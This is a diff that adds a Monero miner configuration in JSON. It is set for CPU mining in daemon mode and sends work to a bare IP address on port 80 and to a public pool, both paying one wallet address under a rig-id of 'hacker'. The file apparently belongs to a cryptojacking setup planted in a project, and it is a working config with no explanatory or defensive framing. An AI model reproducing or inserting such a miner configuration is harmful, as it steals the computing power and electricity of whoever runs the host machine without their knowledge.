@@ -1,0 +1,22 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "coin": "monero",
+            "url": "23.105.171.69:80",
+            "user": "856Ktb2dsPcVC4FadW7Z9DJohNiMbDiEWcR9tGXnQE2j9PDpaur1Fh97PVcvX1198Q6JcQJsUcfdXCVFXsnU3wNjPhgVoak",
+            "tls": true,
+            "daemon": true
+        },
+        {
+            "url": "us-west.minexmr.com:443",
+            "user": "856Ktb2dsPcVC4FadW7Z9DJohNiMbDiEWcR9tGXnQE2j9PDpaur1Fh97PVcvX1198Q6JcQJsUcfdXCVFXsnU3wNjPhgVoak",
+            "rig-id": "hacker",
+            "keepalive": true,
+            "tls": true
+        }
+    ]
+}
